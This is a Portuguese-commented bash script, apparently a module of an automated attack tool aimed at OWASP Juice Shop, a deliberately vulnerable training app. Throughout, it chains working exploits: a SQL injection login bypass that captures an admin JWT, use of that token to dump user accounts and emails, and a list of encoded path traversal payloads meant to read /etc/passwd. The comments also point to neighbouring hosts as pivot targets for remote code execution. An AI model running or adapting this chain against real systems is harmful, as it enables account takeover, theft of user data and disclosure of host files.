#!/bin/bash
# ==============================================================================
# Ruadan — Probe Pós-Autenticação: usa a FALHA DA PÁGINA (SQLi login bypass)
# até a profundidade máxima, com o JWT admin capturado
# ==============================================================================
# Uso: web_post_auth_probe.sh <target> <port> <scheme>
#
# POR QUE: o SQLi probe PARA no bypass (JWT capturado) — o sistema "não sabia
# usar a falha". Este probe CONTINUA a exploração com o token de admin:
#   1. Bypass SQLi no login → JWT admin (reusa a lógica do sqlmap_login_probe)
#   2. WEB_ADMIN_ACCESS  → whoami (identidade comprometida) + produtos/users
#   3. WEB_USERS_DUMP    → enumeração de contas reais (emails da base)
#   4. WEB_FILE_READ     → path traversal no /ftp (leitura de ARQUIVOS DO HOST:
#      /etc/passwd, package.json) com múltiplas codificações — se o servidor
#      entregar /etc/passwd, é leitura real de disco (quasi-shell)
#
# Honestidade: o Juice Shop É SEGURO POR DESIGN quanto a RCE (não executa
# uploads como código, sem eval). A leitura de arquivos via /ftp é o limite
# real do "shell" via página — RCE de host requer um serviço vulnerável
# (ex: os vizinhos 192.168.50.221/222 detectados pelo pivot).
# ==============================================================================
set -u

TARGET="${1:?uso: web_post_auth_probe.sh <target> <port> <scheme>}"
PORT="${2:-80}"
SCHEME="${3:-http}"
CURL_OPTS="-sk --max-time 15"

resolve_url() {
    local base="${SCHEME}://${TARGET}:${PORT}"
    if [ "$SCHEME" = "http" ]; then
        local redir
        redir=$(curl $CURL_OPTS -o /dev/null -w "%{redirect_url}" "${base}/" 2>/dev/null)
        if [ -n "$redir" ] && [[ "$redir" == https* ]]; then echo "${redir%/}"; return; fi
    fi
    echo "$base"
}
BASE_URL="$(resolve_url)"
echo "[post-auth] Alvo: ${BASE_URL}"

# ---- 1. Bypass SQLi → JWT admin ------------------------------------------------
LOGIN_BODY='{"email":"'"'"' OR 1=1--","password":"x"}'
LOGIN_RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" \
    -H "Content-Type: application/json" -d "$LOGIN_BODY" 2>/dev/null)
TOKEN=$(echo "$LOGIN_RESP" | grep -oE '"token":"[^"]+"' | sed 's/"token":"//;s/"$//' | head -1)
if [ -z "$TOKEN" ]; then
    echo "[post-auth] Bypass SQLi falhou nesta execução — sem token, sem profundidade."
    exit 0
fi
echo "WEB_ADMIN_ACCESS: JWT admin obtido via SQLi (login bypass) — ${#TOKEN} chars"

# ---- 2. Identidade comprometida (whoami com o token) ---------------------------
WHOAMI=$(curl $CURL_OPTS -H "Authorization: Bearer $TOKEN" "${BASE_URL}/rest/user/whoami" 2>/dev/null)
if echo "$WHOAMI" | grep -q '"email"'; then
    EMAIL=$(echo "$WHOAMI" | grep -oE '"email":"[^"]+"' | head -1)
    echo "WEB_ADMIN_ACCESS: identidade comprometida ativa — $EMAIL (conta admin em nome da qual atuamos)"
fi

# ---- 3. Dump de contas reais ---------------------------------------------------
USERS=$(curl $CURL_OPTS -H "Authorization: Bearer $TOKEN" "${BASE_URL}/rest/user/whoami" >/dev/null 2>&1; \
        curl $CURL_OPTS -H "Authorization: Bearer $TOKEN" "${BASE_URL}/api/Users" 2>/dev/null)
if [ -n "$USERS" ] && echo "$USERS" | grep -q '"email"'; then
    N_USERS=$(echo "$USERS" | grep -oE '"email"' | wc -l)
    FIRST_EMAILS=$(echo "$USERS" | grep -oE '"email":"[^"]+"' | head -3 | tr '\n' ' ')
    echo "WEB_USERS_DUMP: ${N_USERS} conta(s) enumerada(s) da base real via API admin — ${FIRST_EMAILS}"
fi

# ---- 4. Path traversal no /ftp (leitura de ARQUIVOS DO HOST) -------------------
# Tentativa de ler /etc/passwd através do servidor de arquivos com múltiplas codificações
TRAV_PAYLOADS=(
    "…%2F…%2F…%2F…%2Fetc%2Fpasswd"
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "....%2F....%2F....%2Fetc%2Fpasswd"
    "..%252f..%252f..%252fetc%252fpasswd"
)
FILE_READ=0
for p in "${TRAV_PAYLOADS[@]}"; do
    BODY=$(curl $CURL_OPTS "${BASE_URL}/ftp/${p}" 2>/dev/null)
    if echo "$BODY" | grep -q "root:x:0:0"; then
        echo "WEB_FILE_READ: /etc/passwd DO HOST LIDO via path traversal em /ftp — payload: ${p}"
        echo "$BODY" | head -3 | sed 's/^/    | /'
        FILE_READ=1
        break
    fi
done
[ "$FILE_READ" -eq 0 ] && echo "[post-auth] Path traversal /ftp: servidor não entregou arquivos fora do /ftp (app seguro quanto a LFI — honesto)."

# ---- 5. Leitura legítima dentro do /ftp (challenge real do alvo) ----------------
for f in legal.md package.json.dev; do
    BODY=$(curl $CURL_OPTS "${BASE_URL}/ftp/${f}%3Fmd_debug=.md" 2>/dev/null)
    if [ -n "$BODY" ] && ! echo "$BODY" | grep -qi "error\|not found"; then
        echo "WEB_FILE_READ: /ftp/${f} lido via path/encoding trick — ${#BODY} bytes do servidor de arquivos"
    fi
done

echo "[post-auth] Probe pós-autenticação concluído — falha da página usada até a profundidade disponível."
exit 0
